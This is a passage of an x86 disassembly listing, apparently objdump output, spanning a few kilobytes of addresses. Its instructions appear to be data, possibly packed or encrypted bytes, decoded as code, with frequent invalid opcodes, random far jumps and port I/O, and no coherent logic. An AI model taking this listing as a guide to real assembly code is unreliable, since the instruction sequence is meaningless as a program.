  4215fa:	pop    ds
  4215fb:	add    BYTE PTR [ecx+0x6c],al
  4215fe:	mov    ch,0xce
  421600:	popf   
  421601:	pop    edi
  421602:	sub    eax,edx
  421604:	(bad)  
  421605:	push   ss
  421606:	dec    edi
  421607:	sbb    al,0xb
  421609:	pop    esi
  42160b:	pop    ecx
  42160c:	jge    0x42164c
  42160e:	jb     0x42166f
  421610:	add    eax,0x99e3b35c
  421615:	sub    al,0xea
  421617:	dec    esi
  421618:	sar    BYTE PTR [ebx-0x1a],cl
  42161b:	pusha  
  42161c:	xchg   dh,al
  42161e:	push   ebp
  42161f:	pop    ds
  421620:	add    ah,BYTE PTR [esi-0x345b352d]
  421626:	iret   
  421627:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421628:	sbb    BYTE PTR [eax],bh
  42162a:	inc    edi
  42162b:	push   edi
  42162c:	jae    0x4215c8
  42162e:	adc    ecx,DWORD PTR [ebp-0x2dc63d1]
  421634:	inc    ebx
  421635:	pusha  
  421636:	inc    ecx
  421637:	fwait
  421638:	cmp    al,0xce
  42163a:	mov    al,BYTE PTR [edx+0x5a5731d3]
  421640:	ret    0xd938
  421643:	cmp    cl,bl
  421645:	xor    edx,esi
  421647:	fbld   TBYTE PTR [ebp+edx*1+0x76]
  42164b:	or     BYTE PTR gs:[ecx-0x2b5778a3],ah
  421652:	es retf 0x2686
  421656:	bound  edx,QWORD PTR [ecx-0x4f]
  421659:	mov    esi,0x2ea2a8ea
  42165e:	jmp    0xf3a8a8e7
  421663:	push   es
  421664:	push   0xffffffd4
  421666:	call   0x7a31:0xcf161eab
  42166d:	push   ebp
  42166e:	in     al,dx
  42166f:	jns    0x42168d
  421671:	scas   eax,DWORD PTR es:[edi]
  421672:	sub    edi,DWORD PTR [edi-0x12]
  421675:	(bad)  
  421676:	out    0x31,al
  421678:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421679:	jmp    0x337ed26c
  42167e:	jo     0x42160d
  421680:	sbb    eax,0x74369f95
  421685:	sub    edi,DWORD PTR [eax-0x1ef5e9f6]
  42168b:	fstenv [esi+0x11]
  42168f:	push   ecx
  421690:	sub    di,WORD PTR [edx+0x26]
  421694:	and    ebp,DWORD PTR [ebp+0x6d]
  421697:	outs   dx,BYTE PTR ds:[esi]
  421698:	fst    DWORD PTR ds:0x5cb0199
  42169e:	or     ah,BYTE PTR [ecx]
  4216a0:	pop    ecx
  4216a1:	mov    WORD PTR [esi+0x18],ss
  4216a4:	icebp  
  4216a5:	test   ebp,esi
  4216a7:	out    dx,al
  4216a8:	add    DWORD PTR [ebx],eax
  4216aa:	or     edi,ebx
  4216ac:	jmp    0x421680
  4216ae:	(bad)  
  4216af:	and    dh,BYTE PTR [esi]
  4216b1:	mov    ebx,0x74b6aa02
  4216b6:	stos   BYTE PTR es:[edi],al
  4216b7:	jp     0x42171e
  4216b9:	and    eax,0xe02a034d
  4216be:	or     DWORD PTR [ebx],esp
  4216c0:	fisttp DWORD PTR [esi-0x4cffd1c]
  4216c6:	cmp    DWORD PTR [edx+ecx*1+0x9],0xd285d0b4
  4216ce:	push   eax
  4216cf:	adc    ecx,DWORD PTR ds:0x9d267925
  4216d5:	xchg   esi,eax
  4216d6:	mov    esi,0x2a484be7
  4216db:	retf   0xc32c
  4216de:	pop    ss
  4216df:	cld    
  4216e0:	push   esp
  4216e1:	hlt    
  4216e2:	push   0xffffffaf
  4216e4:	add    al,0x7b
  4216e6:	jmp    0xb793:0xa70a3546
  4216ed:	imul   ebp,DWORD PTR [esi-0x70],0xffffffb4
  4216f1:	test   BYTE PTR [esi-0x74],0x81
  4216f5:	into   
  4216f6:	iret   
  4216f7:	mov    bl,0x77
  4216f9:	mov    bh,0x9f
  4216fb:	cmp    al,0xd9
  4216fd:	pop    edx
  4216fe:	dec    esi
  4216ff:	xlat   BYTE PTR ds:[ebx]
  421700:	lods   eax,DWORD PTR ds:[esi]
  421701:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421702:	test   ah,dl
  421704:	xor    DWORD PTR [edx-0x1a1e023a],eax
  42170a:	clc    
  42170b:	fucom  st(6)
  42170d:	cmp    eax,DWORD PTR [edx-0x1b]
  421710:	fs push esp
  421712:	(bad)  
  421713:	mov    dl,0x88
  421715:	mov    ebp,0x6e62c94f
  42171a:	mov    edi,0x62ec3209
  42171f:	and    BYTE PTR [edi-0x2d3c8140],ch
  421725:	out    dx,al
  421726:	(bad)  
  421727:	sub    dl,0x44
  42172a:	pop    ebp
  42172b:	push   DWORD PTR [ecx+ebp*8-0x2b]
  42172f:	inc    esp
  421730:	jecxz  0x4216ee
  421732:	fcmove st,st(7)
  421734:	or     edi,DWORD PTR [eax]
  421736:	ficomp WORD PTR [ecx-0x65]
  421739:	adc    esi,edi
  42173b:	mov    edi,DWORD PTR [ecx+0x16bbc56a]
  421741:	inc    ebx
  421742:	mov    ebx,0x54d782d7
  421747:	dec    esi
  421748:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421749:	pop    eax
  42174a:	sub    eax,DWORD PTR [edx+edi*1-0x2d]
  42174e:	ret    
  42174f:	aaa    
  421750:	xor    al,0xfa
  421752:	add    BYTE PTR [esi-0x29],ah
  421755:	fstp   TBYTE PTR [ebx]
  421757:	add    BYTE PTR [eax],al
  421759:	lods   al,BYTE PTR ds:[esi]
  42175a:	jge    0x421795
  42175c:	shl    BYTE PTR [ebp+0x722bcb96],0xf8
  421763:	(bad)  
  421764:	les    ebx,FWORD PTR [eax-0x70]
  421767:	pushw  ds
  421769:	xor    dh,ah
  42176b:	mov    ebx,cs
  42176d:	fwait
  42176e:	sub    eax,0x43f0cc39
  421773:	sub    dl,BYTE PTR [edx]
  421775:	hlt    
  421776:	fwait
  421777:	mov    ebp,0x44988ef3
  42177c:	push   es
  42177d:	in     al,0xe7
  42177f:	aaa    
  421780:	mov    bl,BYTE PTR [eax]
  421782:	or     BYTE PTR [edx-0x2c044f9a],ch
  421788:	test   DWORD PTR [eax],esp
  42178a:	imul   ecx,edi,0x69
  42178d:	fs sub ebx,edx
  421790:	repnz push esi
  421792:	sub    eax,0x732b3744
  421797:	mov    edx,0x467c807f
  42179d:	sub    dl,BYTE PTR [ecx+0x71]
  4217a0:	out    0x78,eax
  4217a2:	or     al,0xd0
  4217a4:	retf   0xd907
  4217a7:	rcr    DWORD PTR [esi+edx*2+0x31],0xda
  4217ac:	enter  0x9356,0xae
  4217b0:	sub    eax,0x59fbbd8e
  4217b5:	cmc    
  4217b6:	cmc    
  4217b7:	aad    0xee
  4217b9:	cld    
  4217ba:	mov    ch,0x4f
  4217bc:	xchg   cl,ch
  4217be:	cmp    al,0x67
  4217c0:	test   eax,0x6ba74cae
  4217c5:	inc    eax
  4217c6:	out    dx,eax
  4217c7:	lahf   
  4217c8:	jg     0x42174b
  4217ca:	adc    al,0xa5
  4217cc:	loop   0x42183e
  4217ce:	mov    ecx,0x8fa1910d
  4217d3:	dec    edx
  4217d4:	enter  0x21c5,0x18
  4217d8:	dec    ecx
  4217d9:	adc    BYTE PTR [edx],0xb4
  4217dc:	cmp    ah,BYTE PTR [edi+esi*4+0x33]
  4217e0:	xchg   esi,eax
  4217e1:	retf   0xdae
  4217e4:	retf   0xe4e3
  4217e7:	jae    0x4217f8
  4217e9:	and    al,0x3
  4217eb:	adc    BYTE PTR [edi],al
  4217ed:	jl     0x42177f
  4217ef:	adc    al,0x40
  4217f1:	retf   0x284f
  4217f4:	and    al,0xa7
  4217f6:	inc    esi
  4217f7:	sub    DWORD PTR [edi+0x29],edi
  4217fa:	fs ins DWORD PTR es:[edi],dx
  4217fc:	inc    esi
  4217fd:	dec    edx
  4217ff:	aad    0x35
  421801:	push   ebp
  421802:	das    
  421803:	loope  0x4217f5
  421805:	xchg   ebx,eax
  421806:	jae    0x421886
  421808:	dec    esi
  421809:	jo     0x421801
  42180b:	jl     0x421849
  42180d:	stos   DWORD PTR es:[edi],eax
  42180e:	imul   ebx,DWORD PTR [esi],0x2050b8ea
  421814:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421815:	out    dx,eax
  421816:	cs dec eax
  421818:	add    dh,dh
  42181a:	jbe    0x421874
  42181c:	sbb    ch,BYTE PTR [edi+0x3d]
  42181f:	sbb    DWORD PTR [edi*1+0x14b1d900],esi
  421826:	outs   dx,DWORD PTR ds:[esi]
  421827:	outs   dx,DWORD PTR ds:[esi]
  421828:	lahf   
  421829:	call   0x8822:0x67f6623a
  421830:	ss loope 0x42185e
  421833:	fs out 0x3e,al
  421836:	sar    dl,cl
  421838:	push   ds
  421839:	mov    ch,0x71
  42183b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42183c:	cmp    al,0x2
  42183e:	and    esi,edi
  421840:	fst    DWORD PTR [esi-0x47969ee5]
  421846:	dec    esp
  421847:	aam    0x73
  421849:	sti    
  42184a:	bound  esi,QWORD PTR [ecx+0xd]
  42184d:	sub    ebx,DWORD PTR [edx]
  42184f:	inc    eax
  421850:	xchg   BYTE PTR [edx],dh
  421852:	cdq    
  421853:	jno    0x4218b0
  421855:	pop    fs
  421857:	jmp    0xee73:0x962e7236
  42185e:	or     dh,0xc9
  421861:	sbb    ecx,DWORD PTR [eax+0x1e5189e8]
  421867:	xchg   edi,eax
  421868:	add    bh,BYTE PTR [ecx]
  42186a:	inc    ecx
  42186b:	xchg   bl,bl
  42186d:	sbb    DWORD PTR ds:0x81cf7cb4,eax
  421873:	xchg   ecx,eax
  421874:	pop    es
  421875:	daa    
  421876:	sub    dl,BYTE PTR [esi+ecx*1-0x602bb162]
  42187d:	cdq    
  42187e:	add    dl,BYTE PTR [ebx]
  421880:	ss scas al,BYTE PTR es:[edi]
  421882:	ret    
  421883:	shl    BYTE PTR [ebx+edx*1],cl
  421886:	sub    BYTE PTR [ecx+0x2abe0f80],bh
  42188c:	xor    BYTE PTR [edi-0x76],0x8a
  421890:	jo     0x421884
  421892:	leave  
  421893:	push   ebx
  421894:	dec    esp
  421895:	ja     0x4218c3
  421897:	ss jg  0x421857
  42189a:	mov    esi,0x299f1fe2
  42189f:	mov    ebx,eax
  4218a1:	jb     0x421855
  4218a3:	jbe    0x42183c
  4218a5:	sbb    al,0xd4
  4218a7:	jno    0x4218e7
  4218a9:	pop    edx
  4218aa:	test   DWORD PTR [esi-0x27],eax
  4218ad:	lea    edx,[ebx+0x5c5fc964]
  4218b3:	jge    0x4218ab
  4218b5:	repnz dec edi
  4218b7:	jmp    0x4218c6
  4218b9:	mov    dh,0xd9
  4218bb:	out    0x17,al
  4218bd:	cmp    eax,0x5d50f7a8
  4218c2:	mov    cl,BYTE PTR ds:0xa3d48192
  4218c8:	xchg   ecx,eax
  4218c9:	int3   
  4218ca:	xor    DWORD PTR [esi+ebx*1],eax
  4218cd:	xor    eax,DWORD PTR es:[esi]
  4218d0:	out    0x29,al
  4218d2:	xchg   esi,eax
  4218d3:	or     al,0xa8
  4218d5:	sub    al,0x77
  4218d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4218d8:	and    BYTE PTR [edi-0x1b],cl
  4218db:	xor    BYTE PTR fs:[edx-0x7e],al
  4218df:	ins    DWORD PTR es:[edi],dx
  4218e0:	imul   ecx,DWORD PTR [edx+0x5e02c4c3],0x618e8771
  4218ea:	xor    dl,BYTE PTR [edi-0x1c]
  4218ed:	leave  
  4218ee:	enter  0x6b8d,0x9a
  4218f2:	mov    ch,0x93
  4218f4:	mov    ah,0x7b
  4218f6:	dec    ebp
  4218f7:	bound  esi,QWORD PTR [ecx+0x5d265469]
  4218fd:	call   0x8042:0xab78644c
  421904:	jp     0x4218dd
  421906:	xor    DWORD PTR [esi],esi
  421908:	or     edi,esp
  42190a:	mov    BYTE PTR [eax+0x4e],dh
  42190d:	retf   0x4a3
  421910:	sub    eax,0x9ff74a61
  421915:	inc    edi
  421916:	dec    esp
  421917:	and    DWORD PTR [esi],0x1fc5c0e4
  42191d:	dec    ecx
  42191e:	mov    bh,0xbf
  421920:	enter  0xd183,0x42
  421924:	mov    esp,0x76a7d9f5
  421929:	arpl   WORD PTR [ebx+0x5d5a6817],bp
  42192f:	loope  0x4218c0
  421931:	mov    DWORD PTR ds:0x70649b67,ebx
  421937:	mov    ch,BYTE PTR [esp+esi*4]
  42193a:	xchg   esi,eax
  42193b:	mov    ecx,0xd6d47bd8
  421940:	jle    0x4219b6
  421942:	(bad)  
  421943:	sti    
  421944:	mov    al,ds:0xae31a71f
  421949:	inc    edx
  42194a:	or     BYTE PTR [edi+0x42],al
  42194d:	inc    eax
  42194e:	lahf   
  42194f:	test   bh,al
  421951:	fs scas eax,DWORD PTR es:[edi]
  421953:	call   DWORD PTR [esi-0x2af1de87]
  421959:	aad    0xac
  42195b:	test   eax,0xd78a9aa6
  421960:	dec    ebx
  421961:	out    dx,eax
  421962:	inc    esi
  421963:	(bad)  
  421964:	shl    ecx,cl
  421966:	test   eax,0x73c55b12
  42196b:	push   ds
  42196c:	arpl   WORD PTR [edx-0x67345189],cx
  421972:	inc    edi
  421973:	or     eax,DWORD PTR [eax+eiz*4-0x53]
  421977:	test   al,0xc0
  421979:	repnz mov al,BYTE PTR [eax]
  42197c:	idiv   DWORD PTR [edx-0x26]
  42197f:	cs and al,0x62
  421982:	push   es
  421983:	sub    al,BYTE PTR [ecx+0x4e]
  421986:	jno    0x421a06
  421988:	mov    ah,BYTE PTR [edx]
  42198a:	mov    cl,0x83
  42198c:	or     ch,BYTE PTR [ebx]
  42198e:	cld    
  42198f:	cmc    
  421990:	jmp    0xa123:0xaf3950dd
  421997:	mov    eax,0x6ccc618
  42199c:	in     eax,0x1d
  42199e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42199f:	jge    0x421a1c
  4219a1:	aam    0x99
  4219a3:	aad    0x7e
  4219a5:	inc    edi
  4219a6:	cmp    al,0x4b
  4219a8:	dec    edx
  4219a9:	inc    ecx
  4219aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4219ab:	mov    es,esi
  4219ad:	test   al,0xa
  4219af:	repz into 
  4219b1:	push   edx
  4219b2:	es sti 
  4219b4:	jno    0x42197a
  4219b6:	xchg   ecx,eax
  4219b7:	jae    0x421975
  4219b9:	and    DWORD PTR [eax],ebp
  4219bb:	into   
  4219bc:	or     dh,bl
  4219be:	pop    esi
  4219bf:	add    BYTE PTR [bp+di+0x3c3e],ch
  4219c4:	add    BYTE PTR [ebx],0xb8
  4219c7:	mov    dh,0xdc
  4219c9:	or     al,0x5a
  4219cb:	jg     0x4219c6
  4219cd:	xchg   ebp,eax
  4219ce:	add    BYTE PTR [edx],dh
  4219d0:	xor    bl,dl
  4219d2:	pop    es
  4219d3:	mov    bl,BYTE PTR [edi]
  4219d5:	popf   
  4219d6:	out    dx,eax
  4219d7:	xchg   esp,eax
  4219d8:	popa   
  4219d9:	add    edi,edi
  4219db:	cld    
  4219dc:	push   edx
  4219dd:	fidivr DWORD PTR [ecx-0x75e528e5]
  4219e3:	mov    ecx,0x55faff2
  4219e8:	mov    ebp,0x97c27e07
  4219ed:	add    DWORD PTR ds:0xf07242b1,0xea013a39
  4219f7:	out    0xb6,al
  4219f9:	push   edx
  4219fa:	shl    DWORD PTR [eax-0x7e204f63],1
  421a00:	ret    
  421a01:	idiv   DWORD PTR ds:0x8f19b289
  421a07:	and    dh,cl
  421a09:	pop    ds
  421a0a:	adc    BYTE PTR [ebp+0x3060b154],0xa5
  421a11:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421a12:	and    al,0x76
  421a14:	push   cs
  421a15:	dec    edi
  421a16:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421a17:	jp     0x4219e8
  421a19:	mov    ds:0xebc9bdf3,al
  421a1e:	inc    edi
  421a1f:	ret    
  421a20:	mov    al,ds:0x8977b09
  421a25:	mov    esi,0x72b5746e
  421a2a:	dec    eax
  421a2b:	idiv   DWORD PTR es:[ebx+0x4f7d8059]
  421a32:	(bad)  
  421a33:	(bad)  
  421a34:	mov    ecx,0xde9bc16b
  421a39:	inc    edx
  421a3a:	mov    ah,0x75
  421a3c:	test   eax,0xb44de0aa
  421a41:	mov    eax,0x43709d6b
  421a46:	mov    edi,DWORD PTR [edx]
  421a48:	jo     0x421a5e
  421a4a:	jle    0x421a9d
  421a4c:	ja     0x421aa1
  421a4e:	shl    BYTE PTR [ebx+0xf],1
  421a51:	inc    edx
  421a52:	mov    ebp,0xd7e9530e
  421a57:	pop    ebp
  421a58:	outs   dx,BYTE PTR ds:[esi]
  421a59:	and    cl,ah
  421a5b:	xor    al,bh
  421a5d:	retf   0x7c22
  421a60:	(bad)  
  421a62:	mov    ebx,0x527028d3
  421a67:	retf   
  421a68:	mov    DWORD PTR [eax*4+0x33bfc523],edi
  421a6f:	jae    0x421a3e
  421a71:	cld    
  421a72:	mov    WORD PTR [ebp+0x5c1eee42],fs
  421a78:	das    
  421a79:	add    DWORD PTR [ecx],ebp
  421a7b:	adc    DWORD PTR [ebx-0x6],edi
  421a7e:	adc    bl,al
  421a80:	arpl   WORD PTR [ebx],ax
  421a82:	sbb    DWORD PTR [edx-0x42],0x9758f6c
  421a89:	mov    dh,0xd1
  421a8b:	mov    bh,0x6c
  421a8d:	xchg   ebp,eax
  421a8e:	jecxz  0x421acc
  421a90:	add    ecx,DWORD PTR [esi-0x33d75cfa]
  421a96:	xchg   esp,eax
  421a97:	nop
  421a98:	mov    DWORD PTR [ecx+0x33],eax
  421a9b:	and    bh,BYTE PTR [eax+0x7e]
  421a9e:	(bad)  
  421a9f:	add    eax,0x25d1c803
  421aa4:	call   0xe727c3ed
  421aa9:	push   ecx
  421aaa:	imul   esp,ecx,0x3ce06a4b
  421ab0:	loopne 0x421a44
  421ab2:	inc    edi
  421ab3:	dec    ecx
  421ab4:	push   esp
  421ab5:	(bad)  
  421ab6:	retf   0xaf1
  421ab9:	dec    edx
  421aba:	(bad)  
  421abb:	mov    dl,ch
  421abd:	sahf   
  421abe:	out    0x85,al
  421ac0:	mov    edx,0x218f78e
  421ac5:	popa   
  421ac6:	push   edx
  421ac7:	xchg   edx,eax
  421ac8:	retf   0xe
  421acb:	rol    BYTE PTR [edi+0x5fbe989b],0xd4
  421ad2:	dec    ecx
  421ad3:	aad    0xb5
  421ad5:	nop
  421ad6:	mov    ds:0x34e7fdf6,eax
  421adb:	sub    DWORD PTR [ebx-0x4c88df4e],ecx
  421ae1:	(bad)  
  421ae2:	lods   eax,DWORD PTR ds:[esi]
  421ae3:	mov    bh,0x2e
  421ae5:	push   ss
  421ae6:	xchg   esi,eax
  421ae7:	jae    0x421a9b
  421ae9:	mov    dl,0xa
  421aeb:	mov    es,WORD PTR ds:0xe4c79c70
  421af1:	mov    esi,0x70419c32
  421af6:	int3   
  421af7:	repnz push edi
  421af9:	xor    al,0xbe
  421afb:	dec    ebx
  421afc:	jae    0x421aaf
  421afe:	call   0xe2de2de9
  421b03:	je     0x421acf
  421b05:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421b06:	pop    esi
  421b07:	aaa    
  421b08:	push   es
  421b09:	inc    edx
  421b0a:	pop    es
  421b0b:	jns    0x421aa2
  421b0d:	mov    edi,0x6db9d9e6
  421b12:	mov    BYTE PTR [ecx+0x7c7fc732],cl
  421b18:	rcr    BYTE PTR [esp+edi*1+0x76ac92aa],1
  421b1f:	xchg   ecx,eax
  421b20:	sbb    bl,bl
  421b22:	fnstsw WORD PTR [edx+0x2e704b33]
  421b28:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421b29:	xor    dl,dh
  421b2b:	mov    ch,0x5
  421b2d:	aam    0x3b
  421b2f:	jno    0x421adf
  421b31:	retf   0x7bae
  421b34:	pop    esi
  421b35:	dec    esi
  421b36:	jnp    0x421b36
  421b38:	adc    ebp,edx
  421b3a:	and    eax,0x70edf9b9
  421b3f:	mov    ebx,0x9aa45285
  421b44:	pop    ebp
  421b45:	or     edi,edi
  421b47:	test   cl,ch
  421b49:	xchg   edi,esp
  421b4b:	mov    ebp,0x3b84f086
  421b50:	ds mov al,0xb9
  421b53:	rol    BYTE PTR [esi],cl
  421b55:	jg     0x421bb6
  421b57:	xchg   edx,eax
  421b58:	fdiv   DWORD PTR ds:[ecx+0x46]
  421b5c:	fcomp  DWORD PTR [ebx+ecx*8-0x1c]
  421b60:	add    ebx,DWORD PTR [edx+0x2f9d3434]
  421b66:	aad    0x95
  421b68:	inc    esp
  421b69:	loopne 0x421b8a
  421b6b:	mov    dh,0x1b
  421b6d:	and    bh,dh
  421b6f:	inc    BYTE PTR [ecx+0x3b]
  421b72:	ret    
  421b73:	fstp   DWORD PTR [ecx-0x849cb3f]
  421b79:	pop    edx
  421b7a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421b7b:	out    0x3d,eax
  421b7d:	pop    edx
  421b7e:	jmp    0x437f:0x73311bd1
  421b85:	dec    esp
  421b86:	repnz mov ebp,0x92b68779
  421b8c:	adc    eax,0xf9a4458a
  421b91:	mov    dl,0x7b
  421b93:	add    DWORD PTR [eax+0x2d],eax
  421b96:	jp     0x421bb7
  421b98:	imul   eax,DWORD PTR [ebx+0x46],0x3a
  421b9c:	sbb    ecx,edx
  421b9e:	adc    ch,BYTE PTR [eax-0x69ada852]
  421ba4:	xlat   BYTE PTR ds:[ebx]
  421ba5:	mov    edi,0xd578388c
  421baa:	or     ecx,edi
  421bac:	scas   al,BYTE PTR es:[edi]
  421bad:	jge    0x421b76
  421baf:	call   0x8df2:0x4d139e90
  421bb6:	ss xchg esp,eax
  421bb8:	dec    ebp
  421bb9:	cmp    esp,0x283c44ef
  421bbf:	add    dl,dl
  421bc1:	add    BYTE PTR cs:[ecx-0x5b1e95ef],ch
  421bc8:	xchg   DWORD PTR [esp+ebx*2-0x7309265e],ebp
  421bcf:	mov    al,ds:0x42e32bd4
  421bd4:	pop    edi
  421bd5:	fs cwde 
  421bd7:	fmul   DWORD PTR [ebp+0x2b2ad870]
  421bdd:	mov    ah,0x38
  421bdf:	sbb    esi,eax
  421be1:	scas   eax,DWORD PTR es:[edi]
  421be2:	sub    DWORD PTR [esp+ebx*8+0x42],esp
  421be6:	cmp    BYTE PTR [esi+0x36],cl
  421be9:	mov    dl,BYTE PTR [esi+0x6a14dda7]
  421bef:	loopne 0x421b8b
  421bf1:	mov    ch,BYTE PTR [ecx-0x5a8a125d]
  421bf7:	jmp    DWORD PTR [edi+0x38]
  421bfa:	js     0x421b9e
  421bfc:	mov    edi,0x3eb4dca8
  421c01:	jnp    0x421b99
  421c03:	shl    DWORD PTR [ebp+0x695246ba],0x2a
  421c0a:	dec    ebp
  421c0b:	out    dx,al
  421c0c:	jns    0x421c1e
  421c0e:	push   ds
  421c0f:	ins    DWORD PTR es:[edi],dx
  421c10:	sub    esi,ebp
  421c12:	push   cs
  421c13:	jno    0x421bf8
  421c15:	mov    BYTE PTR [ebp+0x43],cl
  421c18:	mov    DWORD PTR [eax-0x5d53d8d8],0x76b3e606
  421c22:	cmp    ebp,DWORD PTR [ebx+0x4d6eb1a4]
  421c28:	(bad)  
  421c29:	outs   dx,BYTE PTR ds:[esi]
  421c2a:	push   cs
  421c2b:	rol    BYTE PTR [edx-0x60d43540],1
  421c31:	imul   edi,DWORD PTR [esi+0x5e],0x4085d24a
  421c38:	lahf   
  421c39:	scas   al,BYTE PTR es:[edi]
  421c3a:	mov    ds:0xdd9a3ae4,al
  421c3f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421c40:	and    al,0x27
  421c42:	dec    ecx
  421c43:	jae    0x421c25
  421c45:	(bad)  
  421c46:	gs pop ebx
  421c48:	jb     0x421bf3
  421c4a:	stos   DWORD PTR es:[edi],eax
  421c4b:	sub    DWORD PTR [ebp-0xc],esi
  421c4e:	fisub  DWORD PTR [edx-0x5ccac0d0]
  421c54:	je     0x421c73
  421c56:	push   cs
  421c57:	push   edi
  421c58:	ror    BYTE PTR [esi+0x4f43fdd1],0x53
  421c5f:	adc    eax,0x9e65ef7b
  421c64:	xchg   esi,eax
  421c65:	retf   0xea96
  421c68:	cdq    
  421c69:	out    dx,eax
  421c6a:	mov    ch,0xbb
  421c6c:	mov    eax,0x7d8dc42c
  421c71:	xchg   ebp,eax
  421c72:	rcr    ch,1
  421c74:	lock out dx,eax
  421c76:	pop    edx
  421c77:	mov    eax,ds:0xf1bf5c33
  421c7c:	sub    DWORD PTR [eax+0x225effeb],esp
  421c82:	fsubr  QWORD PTR [eax+edi*1+0x52718c16]
  421c89:	aas    
  421c8a:	add    eax,0xa37c93c4
  421c8f:	jmp    DWORD PTR [ebx+ebx*4+0x445f4683]
  421c96:	aas    
  421c97:	mov    cl,0xfe
  421c99:	popa   
  421c9a:	test   al,0x43
  421c9c:	cmp    DWORD PTR [ebx-0x65f458e5],ebp
  421ca2:	in     eax,dx
  421ca3:	jg     0x421ca9
  421ca5:	mov    DWORD PTR [edx],ecx
  421ca7:	dec    edi
  421ca8:	outs   dx,DWORD PTR ds:[esi]
  421ca9:	mov    eax,ds:0x9b73e1e4
  421cae:	push   ds
  421caf:	aas    
  421cb0:	adc    eax,0x113c8898
  421cb5:	cmp    DWORD PTR [ebp-0x5c],edi
  421cb8:	add    ch,BYTE PTR [edi]
  421cba:	addr16 ds (bad) 
  421cbd:	enter  0x4f87,0xa0
  421cc1:	test   DWORD PTR [edx],eax
  421cc3:	cwde   
  421cc4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421cc5:	fbstp  TBYTE PTR [ebx+0x73]
  421cc8:	cld    
  421cc9:	sbb    bl,BYTE PTR [ebp+0x673afcde]
  421ccf:	and    ecx,eax
  421cd1:	(bad)
  421cd4:	and    BYTE PTR [ebx-0x48c32fdb],bh
  421cda:	and    BYTE PTR [edi],0x4f
  421cdd:	pop    edx
  421cde:	out    0xc7,eax
  421ce0:	xchg   ebp,eax
  421ce1:	cld    
  421ce2:	pusha  
  421ce3:	iret   
  421ce4:	adc    esp,esi
  421ce6:	stc    
  421ce7:	shr    DWORD PTR [ebx+eax*8-0x7330edb4],cl
  421cee:	jno    0x421ce2
  421cf0:	enter  0xbd3a,0x7a
  421cf4:	xor    DWORD PTR [edi-0x23],eax
  421cf7:	jge    0x421c9e
  421cf9:	pop    es
  421cfa:	shl    BYTE PTR [esi-0x54],0xfd
  421cfe:	cmp    DWORD PTR [esp+eiz*4+0x1b],ecx
  421d02:	sahf   
  421d03:	mov    edx,0x310e2bc9
  421d08:	sbb    al,0x9e
  421d0a:	sub    BYTE PTR [ebp+0x3],0xc8
  421d0e:	(bad)  
  421d0f:	aad    0xad
  421d11:	test   al,0x73
  421d13:	pop    esi
  421d14:	mov    ah,0xd3
  421d16:	test   DWORD PTR [esi],ebp
  421d18:	or     DWORD PTR [ecx],esi
  421d1a:	mov    WORD PTR [edx],ds
  421d1c:	fwait
  421d1d:	enter  0x161c,0x14
  421d21:	dec    esp
  421d22:	dec    edi
  421d23:	sub    ecx,DWORD PTR [ebp-0x643614ac]
  421d29:	lds    esp,FWORD PTR [ebp+0x2a659e9b]
  421d2f:	mov    ebp,0x711dd47d
  421d34:	xchg   DWORD PTR [esi],edi
  421d36:	xchg   esi,eax
  421d37:	imul   ecx,esi,0x7ae2f3bf
  421d3d:	stc    
  421d3e:	mov    ds:0xcafb5c42,al
  421d43:	and    al,0x36
  421d45:	daa    
  421d46:	sub    DWORD PTR ds:0x22251adf,ebx
  421d4c:	xor    edi,DWORD PTR ds:0x40cb8867
  421d52:	stc    
  421d53:	fisubr WORD PTR [esi+0x19a41984]
  421d59:	sbb    dh,BYTE PTR [ebx]
  421d5b:	fisubr DWORD PTR [eax]
  421d5d:	hlt    
  421d5e:	out    dx,al
  421d5f:	test   dh,ah
  421d61:	dec    edi
  421d62:	pop    edi
  421d63:	pusha  
  421d64:	jne    0x421d5b
  421d66:	into   
  421d67:	in     eax,0x4a
  421d69:	cli    
  421d6a:	out    0xae,eax
  421d6c:	test   DWORD PTR [edi],0xf294f79
  421d72:	scas   al,BYTE PTR es:[edi]
  421d73:	popf   
  421d74:	pusha  
  421d75:	mov    ecx,cs
  421d77:	gs push 0x6227f22f
  421d7d:	stc    
  421d7e:	adc    esp,eax
  421d80:	stos   BYTE PTR es:[edi],al
  421d81:	mov    ?,WORD PTR [ecx-0x45961e6e]
  421d87:	clc    
  421d88:	xor    ecx,DWORD PTR [eax]
  421d8a:	or     bh,cl
  421d8c:	sahf   
  421d8d:	dec    ecx
  421d8e:	dec    edi
  421d8f:	add    DWORD PTR [ebx-0x43],ebp
  421d92:	or     dh,ch
  421d94:	sbb    al,0x30
  421d96:	inc    ah
  421d98:	stc    
  421d99:	push   ebp
  421d9a:	ja     0x421da6
  421d9c:	ds push es
  421d9e:	sub    eax,0xa98445eb
  421da3:	jmp    0xf0d7:0xef3b72bd
  421daa:	imul   eax,DWORD PTR [ebx+0x7b340d09],0xffffffad
  421db1:	add    edi,DWORD PTR [edi-0xb]
  421db4:	jns    0x421daa
  421db6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421db7:	sub    BYTE PTR [edx-0x16a5599c],cl
  421dbd:	(bad)  
  421dbe:	jbe    0x421e37
  421dc0:	stos   BYTE PTR es:[edi],al
  421dc1:	(bad)  
  421dc3:	je     0x421d51
  421dc5:	es mov edi,0xc79a8a06
  421dcb:	loopne 0x421d80
  421dcd:	pop    edi
  421dce:	cwde   
  421dcf:	cwde   
  421dd0:	push   ebp
  421dd1:	retf   0x6e74
  421dd4:	mov    BYTE PTR [esi+0x26],bh
  421dd7:	dec    ebp
  421dd8:	sbb    al,ch
  421dda:	call   ecx
